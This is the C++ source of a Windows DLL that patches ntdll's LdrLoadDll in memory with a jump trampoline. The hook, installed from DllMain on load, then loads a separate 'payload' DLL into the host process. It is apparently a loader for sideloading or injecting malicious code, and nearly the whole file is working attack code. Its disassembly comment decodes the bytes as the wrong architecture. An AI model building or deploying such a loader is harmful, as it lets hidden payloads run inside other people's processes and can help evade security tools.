#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#include <iostream>

using namespace std;



#define DllCount 1
#define s getchar() // Just to pause and for debugging purposes
CHAR Payloads[DllCount][MAX_PATH] = {
                                                ""
                                             };

VOID HookLoadDll(LPVOID lpAddr);


BOOL isFileExist(LPCSTR filename) {

    HANDLE hFile = CreateFileA(filename, FILE_ALL_ACCESS, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {

        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    return TRUE;

}
void GetDllPath(LPCSTR dllname, LPSTR dllPath) {

    
    GetFullPathNameA(dllname, MAX_PATH, dllPath, NULL);


}
NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);

typedef void(WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL,
                                     PULONG DllCharacteristics OPTIONAL,
                                     PUNICODE_STRING DllName,
                                     PVOID *BaseAddress);


LPVOID lpAddr;
CHAR OriginalBytes[50] = {};

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    INT i;
    DWORD dwOldProtect;
    BOOL bAllow = FALSE;
    DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

  
            
           

            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);


            HMODULE status = LoadLibrary(Payloads[0]); // Loading our real Pyload here, we are using LoadLibrary since there is a problem when using ldrLoadDll
           
          
            if (status == NULL)
            {
                printf("Cant load the library ! -> %p", GetLastError());
              //  FreeLibraryAndExitThread(status, 0); // this will exit the thread and terminate the hooked application
                FreeLibrary(status); // Free the module in case an error
                s;
            }

            HookLoadDll(lpAddr); // this will hook the LoadLibrary 1 time , if we want to hook it each time we can free the library at the end so we will call our payload each time LoadLibrary is called, but be aware your payload will be terminated once you free it
    


    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr)
{
    DWORD oldProtect, oldOldProtect;
    void *hLdrLoadDll = &_LdrLoadDll;

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    /*
                              dec    ecx
                             mov    ebx,0xdec0adde
                             fisubr WORD PTR [ebp-0xbe2140]
                               .byte 0xe3
    
    */

    // add in the address of our hook
    *(void **)(boing + 2) = &_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &oldProtect);

    return;
}



extern "C" __declspec(dllexport) void Start() { //dllexport in case we want to call that function later

    char dllPath[MAX_PATH];
    const char* dllname = "abcd.dll";
    if (!isFileExist(dllname)) {

        printf("File is not found ! %p", GetLastError);
        s;
    }
  
   
    DWORD buff = MAX_PATH;

    GetDllPath(dllname, (LPSTR)dllPath);

    printf("Dll Path %s \n", dllPath);
    //  s;
    strcat(Payloads[0], dllPath); // We are copying our dll path into the first position of char array
    printf("First Dll %s \n", Payloads[0]);
    // s;
    printf("LdrLoadDll hook\n\n");

    //// get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 50);

    // set the hook
   
    HookLoadDll(lpAddr);
    
}


BOOL WINAPI DllMain(HINSTANCE hinstance, DWORD fdwReason, LPVOID Reserved)

{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
       

        
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Start, 0, 0, 0);
       
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }
  


    return TRUE;
}